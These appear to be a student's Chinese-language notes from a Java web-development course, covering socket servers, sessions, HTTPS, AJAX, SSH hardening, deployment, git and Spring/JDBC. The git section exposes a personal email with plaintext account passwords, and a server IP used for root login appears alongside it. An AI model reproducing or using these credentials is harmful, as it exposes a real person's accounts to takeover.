-------------------------------------第1课笔记----------------------------------
* 合理利用复制粘贴
* 挖掘共性 使程序易于修改
* 使用循环处理大量重复语句
* 使用函数封装一系列行为

-------------------------------------第2课笔记----------------------------------
* 函数中 传进来的参数用另外的变量接住 尽量避免直接修改
* 函数内的变量和函数外的变量应互相不影响
* 写what不写how how封装到函数中
* command+鼠标左键 跳转到函数定义
* 写一小段运行一小段 确保正确性
* 标准库类似汉语字典 不必执着于全部搞懂
* Idea中option+回车自动import

-------------------------------------第3课笔记----------------------------------
* 避免用到没教的知识
* 区别double和Double
* 编程能力体现于知道修改哪里
* 双击shift 输入jconsole 可试验一些小片段代码
* 类型强制转换
方式一: (int) (y + 0.5 * h)向下取整 精度损失更高
方式二: a.intvalue()四舍五入
* 函数内适当运用空行使逻辑更清晰
* 一段代码重复运用3次以上推荐封装成函数
* log大法 1.显示程序运行路径 2.显示变量的值
    log("line1 in l: <%s>", l)
* 首字母大写的是引用类型 String Integer等
  因此字符串比较中 ==只能比较地址 equals()比较的是地址指向的字符串
* 模板字符串
* 字符串切片 s.substring(0,3) 左闭右开

-------------------------------------第4课笔记----------------------------------
* (Double)a / (Double)b
* 测试函数 ensure(condition, message)
  判断:实际结果==预期结果 如果不等输出message
* break跳出最近一层循环 continue跳过本次进入下次循环
* 可将break的条件放入循环头部的判断条件中
* ArrayList初始化

-------------------------------------第5课笔记----------------------------------
* idea中只需输入main可自动补全
  补全的快捷键是Tab
* 类中:属性(变量)+方法(函数)
  this.name中this指当前实例
* static String classname;
  对student1.classname修改会影响student2.classname
  因为classname是和类绑定的不是和实例绑定的
* private 仅内部可访问

-------------------------------------第6课笔记----------------------------------
* try(xxx) 实现资源自动释放
* StringBuilder便于拼接字符串
* 服务器做的三件事
  接受请求->处理请求->返回响应

-------------------------------------第7课笔记----------------------------------
* 浏览器端:
1 创建一个URL类的实例 分离url的参数并存储
2 构造请求 传入path和host
3 创建socket实例 传入host和port (用try实现资源自动释放和捕获异常)
4 调用socketSendAll发送请求给服务器
5 调用socketReadAll获取响应
* 服务器端:
1 服务器启动 创建serverSocket实例(用try实现资源自动释放和捕获异常)
2 监听到浏览器发起的请求后 调用serverSocket.accept()返回一个socket实例
4 调用socketReadAll获取请求(String类型)
5 对非空请求 创建一个Request类的实例r 传入请求
6 调用responseForPath 传入r.path 返回对应的响应(char[]类型)
7 调用socketSendAll发送响应给浏览器



* CDN 调用其他网站上的资源
* <form>的action填path method填请求类型(GET/POST)
  表单内:
  <input>或<textarea>填写query
  点击<button>提交表单(发送请求)
* split对字符串中不存在的符号分片直接返回原字符串
* 在Request类中 GET的参数放入this.query POST的参数放入this.form
* basic64编码后的空格或中文用URLDecoder.decode()转回
* string和bytes间转换注意传入编码为UTF-8

-------------------------------------第8课笔记----------------------------------
* 重构代码
1 Request类与sever类分离
2 每个页面对应一个html文件 路由函数中只需载入html
3 socketSendAll和socketReadAll与sever类分离 提取到SocketOperator类
4 log()、html()等放入Utility类
5 路由函数全部放入Route类
6 html文件放入templates文件夹 图片文件放入static文件夹(静态资源) 同时修改路径
7 每重构一小段代码测试一次服务器

* 留言板
1 判断请求类型及是否带参数 如果带参数 将Request.query或Request.form保存到data
2 从data中提取author和message存入messageList 格式形如"gua: hello"
3 调用replace将html页面中的{messages}替换成存储的留言
4 Message类:存储author和message 并覆写toString方法
5 messageListHtml():留言在html页面上的显示形式
6 MessageService类:数据的add()、save()和load()

* 判断reader读取是否结束使用reader.ready()
* strip()去掉字符串首尾空格 对body调用strip()判断body是否存在数据
* 序列化 类->字符串；反序列化 字符串->类
* ORM 类和存储的数据之间相互转换
* 数据操作相关的类（Message和MessageService）放入models文件夹
* import只支持绝对路径 且src文件夹不能出现在绝对路径中
  例如在src下新建guaMVC 然后import guaMVC.Utility

--------------------------------------------------------------------------------
  [留言板]
  交互一
  1 浏览器访问 http://localhost:9000/message
  2 服务器监听到请求 调用socketReadAll函数获取请求的原始数据
  3 生成一个Request类型的实例r 对原始请求数据进行解析
  4 responseForPath函数根据请求的路径调用routeMessage函数
  5 routeMessage函数根据请求类型GET将请求的query储存到data
  6 判断data为空 调用MessageService的load函数获取文件Message.txt的所有留言MessageList
  7 调用工具类中的html函数载入html.basic.html作为响应的body部分
  8 调用messageListHtml函数将messageList转换为String类型 并替换页面上的标记
  9 拼接完整响应并转换成二进制后 服务器调用socketSendAll函数将响应发送给浏览器

  交互二
  1 浏览器输入留言并点击"GET提交"按钮
  2 服务器监听到请求 调用socketReadAll函数获取请求的原始数据
  3 生成一个Request类型的实例r 对原始请求数据进行解析
  4 responseForPath函数根据请求的路径调用routeMessage函数
  5 routeMessage函数根据请求类型GET将请求的query储存到data
  6 判断data不为空 调用MessageService的add函数将data添加到Message.txt
    调用MessageService的load函数载入文件Message.txt的所有留言MessageList
  7 调用工具类中的html函数载入html.basic.html作为响应的body部分
  8 调用messageListHtml函数将messageList转换为String类型 并替换页面上的标记
  9 拼接完整响应并转换成二进制后 服务器调用socketSendAll函数将响应发送给浏览器

  交互三
  1 浏览器输入留言并点击"POST提交"按钮
  2 服务器监听到请求 调用socketReadAll函数获取请求的原始数据
  3 生成一个Request类型的实例r 对原始请求数据进行解析
  4 responseForPath函数根据请求的路径调用routeMessage函数
  5 routeMessage函数根据请求类型POST将请求的form储存到data
  6 判断data不为空 调用MessageService的add函数将data添加到Message.txt
    调用MessageService的load函数载入文件Message.txt的所有留言MessageList
  7 调用工具类中的html函数载入html.basic.html作为响应的body部分
  8 调用messageListHtml函数将messageList转换为String类型 并替换页面上的标记
  9 拼接完整响应并转换成二进制后 服务器调用socketSendAll函数将响应发送给浏览器

-------------------------------------第9课笔记----------------------------------
# ModelFactory
#### ModelFactory.load(String className, int fieldCount, Deserializer<T> deserializer)

1. 表面上接收一个实现了Deserializer接口的实例 其实是接收一个匿名函数,Java会自动将函数转为实例,该函数覆写了Deserializer接口内的**T deserialize(List<String> modelData)**
,函数体如下:
```
(modelData) -> {
  String author = modelData.get(0);
  String message = modelData.get(1);
  Message m = new Message();
  m.author = author;
  m.message = message;
  return m;
}
```
传入后在**T model = deserializer.deserialize(modelData);**
处调用该匿名函数

2. 数据的转换流程:
```
data          "gua\n123\nbai\n456\n"                                    
modelsData    [gua, 123, bai, 456]                                          
modelData     [gua, 123]等                                                    
model         (author: gua, message: 123)等                                            
models        [(author: gua, message: 123), (author: bai, message: 456)]    
```

# 其他
 类只能继承一个父类 但可以实现多个接口


# [登录]
### 交互一
 1. 浏览器访问 http://localhost:9000/login
 2. 服务器监听到请求 调用socketReadAll函数获取请求的原始数据
 3. 生成一个Request类型的实例r 对原始请求数据进行解析
 4. responseForPath函数根据请求的路径调用RouteUser类的login函数
 5. login函数根据请求类型GET将请求的query储存到data
 6. 判断data为空
 7. 调用工具类中的html函数载入login.html作为响应的body部分并替换页面上的标记
 8. 调用responseWithHeader函数 传入状态码、header和body 返回完整响应的字符串形式
 9. 将响应转换成二进制
 10. 服务器调用socketSendAll函数将响应发送给浏览器

### 交互二
 1. 浏览器输入用户名和密码并点击"登录"按钮
 2. 服务器监听到请求 调用socketReadAll函数获取请求的原始数据
 3. 生成一个Request类型的实例r 对原始请求数据进行解析
 4. responseForPath函数根据请求的路径调用RouteUser类的login函数
 5. login函数根据请求类型POST将请求的form储存到data
 6. 判断data不为空 调用UserService类的validLogin函数判断是否为已注册用户
 7. 调用工具类中的html函数载入login.html作为响应的body部分并替换页面上的标记
 8. 调用responseWithHeader函数 传入状态码、header和body 返回完整响应的字符串形式
 9. 将响应转换成二进制
 10. 服务器调用socketSendAll函数将响应发送给浏览器

# [注册]
### 交互一
 1. 浏览器访问 http://localhost:9000/register
 2. 服务器监听到请求 调用socketReadAll函数获取请求的原始数据
 3. 生成一个Request类型的实例r 对原始请求数据进行解析
 4. responseForPath函数根据请求的路径调用RouteUser类的register函数
 5. register函数根据请求类型GET将请求的query储存到data
 6. 判断data为空
 7. 调用工具类中的html函数载入register.html作为响应的body部分并替换页面上的标记
 8. 调用responseWithHeader函数 传入状态码、header和body 返回完整响应的字符串形式
 9. 将响应转换成二进制
 10. 服务器调用socketSendAll函数将响应发送给浏览器

### 交互二
 1. 浏览器输入用户名和密码并点击"注册"按钮
 2. 服务器监听到请求 调用socketReadAll函数获取请求的原始数据
 3. 生成一个Request类型的实例r 对原始请求数据进行解析
 4. responseForPath函数根据请求的路径调用RouteUser类的register函数
 5. register函数根据请求类型POST将请求的form储存到data
 6. 判断data不为空 调用UserService类的add函数将用户添加到数据库
 7. 调用工具类中的html函数载入register.html作为响应的body部分并替换页面上的标记
 8. 调用responseWithHeader函数 传入状态码、header和body 返回完整响应的字符串形式
 9. 将响应转换成二进制
 10. 服务器调用socketSendAll函数将响应发送给浏览器

-------------------------------------第10课笔记----------------------------------
# Todo
#### /todo
1. 浏览器访问 http://localhost:9000/todo
2. 服务器监听到请求 调用socketReadAll函数获取请求的原始数据并解析
3. responseForPath函数根据请求的路径调用RouteTodo类的index函数
4. 调用工具类中的html函数载入todo_index.html作为响应的body部分
5. 调用TodoService类的todoListHtml函数获取所有todo并替换掉页面上的标记
6. 调用responseWithHeader函数 传入状态码、header和body 返回响应的字符串形式
7. 将响应转换成二进制 服务器调用socketSendAll函数将响应发送给浏览器

#### /todo/add
1. 在todo_index.html页面 输入content 点击"添加todo"按钮
2. 服务器获取请求的原始数据并解析 根据路径调用RouteTodo类的add函数
3. 从原始数据中获取form 传入TodoService的add函数
4. 从form的content属性中获取todo内容 配上其他属性后添加到数据库
5. 调用redirect函数重定向到指定页面

#### /todo/delete
1. 在todo_index.html页面 对id为1的todo点击"删除"按钮
2. 服务器获取请求的原始数据并解析 根据路径调用RouteTodo类的delete函数
3. 从原始数据的query中获取id 传入TodoService的delete函数
4. 根据id删除指定todo并同步到数据库
5. 调用redirect函数重定向到指定页面

#### /todo/update
1. 在todo_index.html页面 对id为2的todo点击"编辑"按钮
2. 服务器获取请求的原始数据并解析 根据路径调用RouteTodo类的update函数
3. 从原始数据中的form中获取id和content 传入TodoService的update函数
4. 根据id更新指定todo并同步到数据库
5. 调用redirect函数重定向到指定页面

# Route.currentUser()
根据cookie 返回指定用户或guest用户
```
public static User currentUser(Request request) {
        if (request.cookies.containsKey("username")) {
            String username = request.cookies.get("username");
            User user = UserService.findByName(username);
            if (user != null) {
                return user;
            } else {
               return UserService.guest();
            }
        } else {
            return UserService.guest();
        }
    }
```


# 其他
* 重定向响应
* todo的增删改查
* 用超链接实现删除和编辑按钮
* 只用来操作数据的路由叫API
* 只用来返回页面的路由叫View
* getOrDefault()
* Cookie实现不同请求的关联
* 登录时服务器的响应要求浏览器Set Cookie\
  之后浏览器发出的任意请求都带该Cookie
* 根据Cookie返回指定用户或游客

-------------------------------------第11课笔记----------------------------------
* 登录时生成一个sessionId映射到u.id 响应中Set-Cookie字段的值即sessionId 将映射保存到哈希表session
* currentUser中 根据sessionId获取用户id
* jwt: 不通过哈希表 只将信息加密成随机字符串 并检测是否被篡改
* session目前具有不可替代性
* 退出登录的实现可以通过删除session中的映射
* session共享 多台服务器之间询问存有session的服务器
* 集群 一台服务器收到大量请求 分发给多台服务器处理(收发响应同理)
* 站在巨人的肩膀上
* session持久化存储
* 用户权限
  1.当需要限制住一个属性的值为指定的几个值
  用枚举定义新类型UserRole
  enum UserRole {
    guest, admin, normal;
  }

  2.管理员身份在数据库手动修改获得
  3.路由函数中 判断是否为游客 游客重定向到登录页面 实现todo页面只能被已注册用户访问
  4.管理员使用的路由不做重定向直接返回404

* 重构
  1.改用路由表处理路由分发 路由表按类型分散存储到对应路由类 在server中载入所有路由表
  2.用/static访问所有图片

* 方法引用 Route:routeIndex

-------------------------------------第12课笔记----------------------------------
# Note12
* CA拥有 **公钥A 私钥a**
* 服务器拥有 **公钥B 私钥b**
* 客户端和服务器共享 **对称密钥C**

#### HTTPS
1. 客户端申请https通信
2. 服务器响应并向客户端传递证书
3. 客户端验证证书, 获取服务器公钥B, 生成对称密钥C, 用B加密后传给服务器
4. 服务器用私钥解密, 获取对称密钥, 并通知客户端.
5. SSL通道建立完成, https通信建立完成
6. 客户端和服务器利用对称密钥进行加密通信

#### 数字证书
1. **申请**:
  服务器本地生成一对密钥
  将明文P(公钥B和其他信息)递交给CA申请数字证书
  CA根据P生成摘要H 用CA私钥a对H进行加密得到数字签名S
  将P和S整合在一起生成数字证书授予服务器
2. **验证**:
   在客户端拿到服务器的数字证书后(即拿到明文P和签名S)
   从明文P中取出服务器公钥B 计算P的摘要H1
   判断是否H1 = H
   用客户端内置的CA公钥A对签名S解密 得到H2
   判断是否H2 = H1
   若H=H1=H2 则证书有效

#### session
 1. 客户端向服务器发送请求
 2. 服务器给客户端分配sessionID
 3. 客户端保存sessionID 之后每次发送请求都带上sessionID
    (当客户端为浏览器时, 默认采用cookie的方式保存sessionID)
 4. 服务器根据sessionID把用户信息临时保存在服务器上, 并设置过期时间

#### 其他
* **摘要** 给定任意长度的文本 生成定长的文本
  用于检查原文是否被篡改或存储用户密码
* **碰撞** 一段摘要对应两个不同的原文
* **加盐** 密码和随机字符串相加 再计算摘要
* **彩虹表** 存储了简单的原文和摘要值的对应关系
* **对称加密** 用同一把密钥加密和解密
* **非对称加密** 公钥加密则只有私钥能解密 私钥加密则只有公钥能解密
  A和B交换公钥 A用B的公钥加密后发送给B B用B的私钥解密得到原文
* **证书链**
  A的证书(根证书)验证A的下属机构B的证书
  B的证书验证服务器的证书
* 反射
* 计算一个文件的md5:md5 <文件路径>
* 密码可通过其他网站查询到 通过加盐避免
* 目前安全性高的 慢hash算法
* 加密可逆 摘要不可逆

-------------------------------------第13课笔记----------------------------------
# gradle
每次修改HTML页面都要重启服务器 因为**gradle是从build中读取资源文件**
#### **目录**:
  * **.gradle** gradle内部自用
  * **.idea** idea内部自用
  * **build** 编译后的输出(类似out)
  * **src.java** 源代码
  * **src.resources** 资源文件

#### **模板引擎freemarker**
  * **配置步骤**
    * 搜索freemarker gradle 复制代码到build.gradle的dependencies内
    * IDE自动下载到External Libraries 点击右上角大象圈圈load gradle changes
    * guaMVC下新建GuaTemplate 拷贝指定配置 import相关class
  * **调用示例**
```
HashMap<String, Object> d = new HashMap<>();
d.put("messages", messageList);
String body = GuaTemplate.render(d, "html_basic.ftl");
```
  * **语法示例**
```
<#list messages as m>
    <#if m.author == "gua">
        <h3>管理员 ${m.author}</h3>
    </#if>

    <h3>
    ${m.author}: ${m.message
    </h3>

    <br>  
</#list>
```
  * freemarker要求**当前类的属性实现get和set方法**(快捷补全:generate -> getter and setter -> 选中要补全的属性)


# 其他
* **用static修饰代码块** 表示只初始化一次
* **模板** 在web开发中 根据后端返回的数据,生成html文档并通过置换等方式渲染,实现view和data的分离,业务代码和逻辑代码的分离
* **数据库**
  * 关系型(MySQL等):类似excel表 增加新字段时 旧有数据也会加上新字段
  * 非关系型(MongoDB等):旧有数据不用增加新字段
* **MySQL**
  * SQL的创表语句 CRUD语句
  * 少量数据的修改使用鼠标操作

-------------------------------------第14课笔记----------------------------------
# gradle安装包的配置
* **注意gradle和.gradle是不同的文件夹**

* idea工程目录的guaMVC/gradle/wrapper下
  * gradle-5.4.1-all.zip(默认联网下载 可先下载到本地再手动导入)
  * gradle-wrapper.jar
  * gradle-wrapper.properties\
(从指定位置导入gradle的zip包 导入后保存到.gradle/wrapper/dists 解压后保存到.gradle/wrapper/dists)

# 添加事件的流程
  * 获得按钮button
  * 定义一个函数func
  * 将按钮与函数绑定
```
常规方式
button.addEventListener('事件名', func)
匿名/回调函数方式
button.addEventListener('事件名', func() {
      回调函数体
})
```

# 纯前端todo
  * 将选择器封装成函数e
  * 调用e取到"添加todo"的button
  * 将click事件与button绑定并定义回调函数
  * 回调函数的操作:
获取todo的文本value
调用todoTemplate将文本拼成一段todoCell
调用insertCell将todoCell插入todoList
[刷新后todoList的数据会消失]

# AJAX
* **概述** 使用JS直接向后端发送请求的API
* **比较**
  * 传统方式:前端先将form表单的数据放入body 再向后端发送完整请求 且响应需要返回完整页面
  * AJAX:前端借助该API将数据发送到后端 后端经过路由函数处理后返回响应(不一定是完整页面) 前端收到响应并调用响应函数
* **实现**
  * 创建AJAX对象
  * 设置请求方法、请求地址和选择异步/同步
  * 设置Content-Type
  * 注册响应函数 (当后端返回响应时调用)
  * 发送请求
* **后端处理** routeImage和parseForm需要新增判断待解析数据是否为JS文件
* **AJAX的优点**
AJAX请求无须刷新整个页面
因为服务器响应内容不再是整个页面，而是页面中的部分内容，所以AJAX性能高

# 其他
* **JS的回调机制及其必要性**
js不支持多线程 监听事件会使程序阻塞 因此只能先将函数传入 让浏览器代为监听(也叫在浏览器上注册) 等到需要调用时再回头调用该函数
* **回调** 强调函数作为参数传入后 等到适当的时机再调用 **高阶函数** 强调函数可作为函数参数和返回值
* **序列化**(JS对象->JSON字符串)和**反序列化**(JSON字符串->JS对象)
* 服务器使用现成的库解析浏览器传输过来的JSON字符串
* 每个HTML标签都有class和id属性
* **script标签的位置** 由于浏览器从上往下渲染的特点 script标签放在body标签闭合之前
* **DOM API** 浏览器提供给JS的操作html页面元素的方式
  * 查找元素(元素选择器 class选择器 id选择器)
  * 操作元素(增,删,改)
* **mdn**+xxx 相关技术文档检索(前端)
* button的**innerHTML**和**innerText**
* JS的**==**会自动转换类型 **===**才是值的比较
* JS中 **var**和**let**的作用域不同 let是新的用法且比var更安全
* **跨域** 在A页面的控制台向B页面发请求
* **CORS**(跨域资源共享)能够克服AJAX的同源限制
https://www.ruanyifeng.com/blog/2016/04/cors.html

-------------------------------------第15课笔记----------------------------------
# MVP Minimum Viable Product
1. **todo的model**
2. **操作场景的文档** （对这些数据做什么操作，这是最重要的一步）
    - 有一个主页，可看到所有todo
    - 主页有一个表单可以添加todo
3. 根据文档**实现 CRUD 和其他操作**
4. **路由函数**
5. **HTML 页面**
6. **用 JS 实现相关页面的逻辑**
7. **美化页面**

# 访问ajaxTodo页面
* 浏览器**发出常规请求** [GET /ajax/todo HTTP/1.1]
* 服务器调用路由函数RouteAjaxTodo::indexView **返回HTML页面**
* 浏览器根据script标签 **发出常规请求** [GET /static?file=ajax_todo.js HTTP/1.1]
* 服务器调用路由函数Route::routeImage **返回ajax_todo.js文件**
* 浏览器执行ajax_todo.js 调用loadTodos() **发出AJAX请求** [POST /ajax/todo/all HTTP/1.1] body为空 并调用bindButtonClick()**注册点击事件**
* 服务器调用路由函数RouteAjaxTodo::all 按JSON格式**返回所有todo**
* 浏览器调用loadTodos()内**AJAX请求的回调函数** 解析响应body的JSON字符串 循环调用TodoTemplate()和insertTodo()
* 得到每个todo的HTML单元并添加到页面 实现在页面上**显示所有todo**

# 输入todo并点击添加按钮
* 在**该按钮的点击事件已注册**的前提下
* 浏览器调用bindButtonClick()中**addEventListener的回调函数**
* **发出AJAX请求** [POST /ajax/todo/add HTTP/1.1] body为{content: input.value}
* 服务器调用路由函数RouteAjaxTodo::add 获取请求的body 转成JSONObject对象 调用getString()获取input.value即todo内容 调用TodoService.add() **将该todo添加到数据库**并返回该todo 将该todo转成JSON格式放入响应的body **返回响应**
* 浏览器调用bindButtonClick()内**AJAX请求的回调函数** 解析响应body的JSON字符串(形如{"completed":false,"content":"heiheihei","id":15}) 得到该todo 调用TodoTemplate()和insertTodo() 得到该todo的HTML单元并添加到页面 实现在页面的所有todo之后**显示新增todo**

# 其他
* **前后端分离** 后端负责数据 前端负责展示
  * 潜在问题: 搜索引擎搜索不到数据 网速导致的首页白屏
  * 解决方法: 服务端渲染SSR 前端自己启用一个服务器拼接来自后端的数据
* **CSS**
  * 内联(直接写在目标标签内)         不建议
  * 统一写在style标签内)            偶尔
  * 外联(从外部导入css文件到HTML)    推荐
* **CSS选择器**
  * 元素选择器
  * class选择器
  * id选择器
* **样式优先级**(从高到低)
  * !important
  * 内联
  * 按顺序执行 后执行会覆盖先执行
* **选择器优先级**(从高到低)
  * !important
  * 内联
  * id选择器
  * class选择器
  * 元素选择器

* **CSS检查器** 从页面调整CSS
* **常用CSS属性**
  * **display** 设置元素如何被展示
  * **position** 设置元素的定位方式
  * **z-index** 设置元素的堆叠顺序
  * **overflow** 设置内容溢出的处理方式
  * **background** 设置背景色/背景图
  * **float** 设置元素向哪个方向浮动
  * block和非block元素的**居中方式**(水平居中 垂直居中 水平垂直居中)
* **盒模型**
* **伪元素、伪类**

-------------------------------------第16课笔记----------------------------------
# 常用Linux命令(见预习)

# 用 key 而不是用 password 来登录的原因
对运行中的服务器而言 每天都会有大量的来自陌生IP的尝试密码登陆

一旦通过密码方式登陆成功将威胁到服务器安全 因此禁用密码登陆 改用密钥登陆

# ssh设置
#### 在本地生成公私钥
    打开终端 输入ssh-keygen命令 .ssh文件夹下将生成两个文件保存一对公私钥 id_rsa 是私钥 id_rsa.pub 是公钥
#### 添加公钥到服务器
    1. 打开filezilla 以用户名ubuntu及相应密码登录服务器
       将公钥文件上传到服务器的/ubuntu目录下[通过filezilla上传公钥比终端上传更安全]
    2. 在终端界面 输入ssh ubuntu@ip命令登录服务器
    3. 输入sudo su命令切换到管理员身份
    4. 输入mkdir -p /root/.ssh命令 root目录下如果没有.ssh文件夹将创建该文件夹
    5. 输入cp /home/ubuntu/id_rsa.pub  /root/.ssh/authorized_keys命令
       将之前通过filezilla上传到服务器的公钥拷贝到.ssh文件夹下的authorized_keys文件内
#### 测试公钥
    输入service ssh restart命令重启ssh
    新建一个终端窗口 输入ssh root@ip命令 测试是否能通过root用户免密登录服务器
#### 关闭密码登录
    1. 打开filezilla 站点管理器->创建新站点
       协议为SFTP 主机为ip 端口为22 登录类型为密钥文件 用户名为root 导入本地生成的私钥文件 点击连接到服务器
    2. 在filezilla界面 进入目录/etc/ssh 编辑sshd_config文件
       修改最后一行PasswordAuthentication的值为no
    3. 在终端界面 登上服务器的前提下 输入service ssh restart命令重启ssh[必须重启! 否则改动不会生效]
    4. 新建一个终端窗口 分别输入ssh root@ip和ssh ubuntu@ip命令测试是否只允许root用户免密登录服务器
    5. 此后在终端只可通过ssh root@ip命令登录服务器 在filezilla通过站点管理器内的站点配置直连服务器

# 防火墙
```
apt install ufw
ufw allow 22
ufw allow 80
ufw allow 443
ufw allow 9000
ufw default deny incoming
ufw default allow outgoing
ufw enable
ufw status verbose
```

-------------------------------------第17课笔记----------------------------------
# 服务器部署
#### 线下部署
* 配置build.gradle并`run ssm[build]`
* bulid/libs目录下出现guaMVC-1.0.jar[解压可查看内容]
  * com/alibaba/fastjson 依赖的库
  * freemarker 依赖的库
  * guaMVC 源代码
  * static 资源文件
  * templates 模板文件
* 使用idea自带terminal运行jar包
  1. 进入jar包所在目录 `cd build/libs`
  2. 确保java命令可用 `java -version`
  3. 运行jar包 `java -Dfile.encoding=UTF-8  -jar guaMVC-1.0.jar`
  4. 校对调用资源路径[参考Utility.java]
    * 从jar包 `/templates/index.html`[因为templates文件夹位于jar包的根目录]
    * 常规方式 `build/resources/main/templates/index.html`
  5. 在jar包外新建数据库
    * ![](assets/markdown-img-paste-20200816111212506.png)
    * 路径示例  `build/libs/db/User.txt`

#### 线上部署
* 使用idea自带terminal
  * 在jar包所在目录下上传jar `scp guaMVC-1.0.jar root@106.53.212.15:/tmp/server.jar`
* 使用Mac的terminal
  1. 登陆服务器 `ssh root@106.53.212.15`
  2. 安装openjdk `apt install openjdk-11-jdk`
  3. 在tmp目录下建立数据库
    1. `mkdir db`
    2. `cd db`
    3. `touch Session.txt`等[User.txt Message.txt Todo.txt]
  4. **在tmp目录下** 运行jar包 `java -jar  /tmp/server.jar`
    1. [后台运行 `java -jar /tmp/server.jar &`]
    2. 运行时所在目录不对会导致找不到db/xxx.txt
    3. 结束运行 control+C
    4.  查看运行中的java程序 `ps aux | grep java`
  5. 访问
    1. Mac下新建一个terminal
    2. 登陆服务器 `ssh root@106.53.212.15`
    3. 服务器端本地访问 `curl localhost:9000`
    4. 打开9000端口 `ufw allow 9000`
    5. 浏览器端访问 输入网址106.53.212.15:9000
* 服务器潜在缺陷
    1. 日志输出
    2. BUG复现
    3. 守护进程
    4. 中文乱码
      * 编辑文件 `nano /etc/environment`
      * 加入内容并保存退出
      ```
      LC_CTYPE="en_US.UTF-8"
      LC_ALL="en_US.UTF-8"
      ```

# git
#### Sourcetree
  * 将桌面的test_git拖到Sourcetree的本地
  * 打开test_git 按住`shift+command+.`显示隐藏文件夹.git
  * 在test_git内新建文件a.txt
  * ![](assets/markdown-img-paste-20200817094921328.png)
  * 暂存a.txt->输入信息->点击提交
  * 分支->新建分支->命名为dev 新建b.txt
  * 分支->双击切换到master->右键dev->合并到master 合并后a.txt和b.txt都是最新改动
  * ![](assets/markdown-img-paste-20200817101713596.png)
  * 远端->origin 推送到远程仓库 可在coding.net内查看

#### Coding [github的国内替代品]
  * 打开Mac自带terminal  
  * `ssh-keygen` 生成一对公私钥 命名为coding
  * `mv coding ~/.ssh` `mv coding.pub ~/.ssh` 将生成的公私钥移动到.shh目录下
  * `cat ~/.ssh/coding.pub` 复制公钥添加到coding.net
  * `ssh-add -K ~/.ssh/coding` 私钥让ssh能够识别

#### clone [coding.net->服务器]
  * root登陆服务器
  * `cd /var`
  * `mkdir www`
  * `git clone 项目的https/ssh连接`
  * 如果是https连接需要输入账号密码 xuluchen0412@gmail.com a123456[密码为coding的服务密码a123456 非登陆密码a123456789/]

#### push [服务器->coding.net]
  * 进入java_test文件夹
  * `touch c.txt`
  * `git status` 可看到c.txt未被跟踪(untracked)
  * `git add c.txt` 纳入跟踪
  * `git commit -m "first commit"` 提交
  * `git log` 查看日志
  * `git push` 输入账号密码

#### pull [coding.net->服务器]
  * 在coding.net界面 在线修改c.txt并提交
  * 在服务器端 `git pull`

# 其他
  * 服务器和coding.net之间也使用公私钥通信
    * 在服务器端 `ssh-keygen`
    * `cat ~/.ssh/id_rsa.pub` 复制公钥存入coding.net
    * 在var/www目录下 `git clone git@e.coding.net:orion1900/java_test/java_test.git`
  * 在idea右键a.txt->git->add纳入git管理 目录下a.txt由红变绿
  * 框架 tomcat(类似server.java 负责接收请求和返回响应) spring(负责处理请求) Servlet(框架之间的接口规定)
  * BUG
    * sourcetree不能克隆远程仓库到本地的情况下
    * 先使用命令行克隆到本地 `git clone git@e.coding.net:orion1900/java_test/java_test.git`
    * 然后在sourcetree界面手动导入该本地仓库进行管理

-------------------------------------第18课笔记----------------------------------
# Spring
  * Spring Spring MVC Spring Boot
  * Spring boot 默认内置了名为 tomcat 的 http 服务器
  * application.properties 配置
  * 约定大于配置
  * 依赖注入 路由函数均是实例方法 实例化由Spring实现
  * 控制反转

# HelloWorldController
  * @Controller 表明这是一个路由函数
  * @GetMapping('/') 表明只接受GET请求 路径为/
  * 路由函数取出参数的4种方式

# Weibo
  1. 实现 WeiboModel
  2. 实现 WeiboService
  3. 实现 WeiboController
    1. 实现路由 /weibo
    2. 实现路由 /weibo/add
    3. ...
  4. 实现 weibo_index.ftl 等页面

# JDBCDemo
  #### getDataSource()
    1. 创建MysqlDataSource类型的实例dataSource
    2. 设置用户名、密码、服务器IP、数据库名字
    3. 设置时区和编码
    4. 将配置好的dataSource作为返回值返回
  #### MySQL Workbench
    1. 复制工程目录下的schema.sql内的sql语句到Workbench
    2. 执行后将创建数据库ssm和表todo
  #### addBySQL(...)
    1. 获取dataSource、connection和statement
    2. 执行sql语句 `statement.executeUpdate(sql);`
    3. 资源释放
  #### selectBySQL(...)
    1. ...
    2. 执行sql语句 `statement.executeQuery(sql)` 查询结果存入一个ResultSet类型的数据集rs中
    3. 从rs获取查询结果的第一行数据 `rs.first()`
    4. ...
  #### SQL注入 selectBySQLInjection(...)
  #### SQL防注入 selectBySQLSafe(...)
    * ![](assets/markdown-img-paste-20200819104950404.png)
    1. ...
    2. 准备预编译语句 value用"?"代替
    3. 获取PreparedStatement类型的statement
    4. 传入value `statement.setString(1, content);`
    5. ...

# TodoService + MySQL
  #### addBySQL(...)
    1. 创建一个TodoModel命名为m并传入content
    2. ...
    3. 要求数据库返回id `PreparedStatement statement = connection.prepareStatement(sql, Statement.RETURN_GENERATED_KEYS);`
    4. 从statement从获取数据集rs 从rs获取id并存入m
    ```
    // 用try语句实现资源自动释放
    try(ResultSet rs = statement.getGeneratedKeys()) {
                rs.first();
                Integer id = rs.getInt("GENERATED_KEY");
                m.setId(id);
            }
    ```
    5. ...
    6. 返回m
  #### findByIdSQL(...)
  #### allBySQL()

# Spring日志分析

  #### 日志1
  `2020-06-19 16:25:41.556 DEBUG 10995 --- [nio-9000-exec-1] o.s.web.servlet.DispatcherServlet        : GET "/user/profile?id=1", parameters={masked}`

    1. 2020-06-19 16:25:41.556 表示时间 DEBUG 表示日志级别
    2. 10995 是程序运行的进程的 pid [nio-9000-exec-1] 是程序运行的线程相关信息 9000是端口号
    3. o.s.web.servlet.DispatcherServlet 是日志 log 时所处的函数
    4. GET 表示请求方法 "/user/profile?id=1" 表示请求的 url
    5. parameters={masked} 的表示参数被隐藏 即请求参数不在日志中显示

  #### 日志2(报错日志)
  `2020-06-20 04:34:27.699 ERROR 70208 --- [  restartedMain] com.zaxxer.hikari.pool.HikariPool        : HikariPool-1 - Exception during pool initialization.
java.sql.SQLException: Access denied for user 'root'@'localhost' (using password: YES)
    at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:129) ~[mysql-connector-java-8.0.17.jar:8.0.17]
    ...`

    1. 第一行 报错行 ERROR 代表这是一个报错 `HikariPool-1 - Exception during pool initialization.` 是报错的 log 信息, 一般是说报错的阶段或者报错的简单原因
    2. 第二行 报错直接原因 一至多行 可以copy到搜索引擎来debug
    3. 第三行及以后 报错的函数调用栈
      * at 开头 代表具体在哪个文件的哪个函数的哪一行出错 越下面的离出错的现场越远

  #### 日志3(报错日志的函数调用栈部分)
